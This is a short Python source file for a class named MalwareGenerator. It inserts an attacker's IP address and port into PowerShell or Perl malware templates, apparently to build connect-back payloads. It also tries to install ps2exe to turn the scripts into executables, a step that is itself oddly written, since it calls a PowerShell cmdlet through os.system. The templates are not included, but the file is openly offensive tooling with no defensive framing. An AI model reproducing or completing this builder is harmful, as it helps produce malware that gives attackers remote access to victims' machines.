import random, os
class MalwareGenerator:
    def __init__(self, ip, port):
        self.config = {"ip": ip, "port": port}
    def FormatMalware(self, malware : str, language):
        if(language == "powershell"):
            roud = 0
            final  = ""
            for x in malware.split("\n"):
                roud += 1
                if(len(x) > 0):
                    if("#var" in x):
                        x = x.replace('{*ip*}', self.config["ip"])
                        x = x.replace('{*port*}', self.config["port"])
                        x = x.replace("#var", "")
                    #x = x.replace("\"", "\\\"")
                    if(roud > 1):
                        ##final += "$cmd += '"+ x + "'\n"
                        pass
                    else:
                        pass
                final += x + "\n"
            final = final.strip()
            return final
        elif(language == "perl"):
            roud = 0
            final  = ""
            for x in malware.split("\n"):
                roud += 1
                if(len(x) > 0):
                    if("#var" in x):
                        x = x.replace('{*ip*}', self.config["ip"])
                        x = x.replace('{*port*}', f"\"{self.config['port']}\"")
                        x = x.replace("#var", "")
                    #x = x.replace("\"", "\\\"")
                final += x + " \n"
            final = final.strip()
            return final
    def P2EXE(self):
        os.system("Install-Module -Name ps2exe")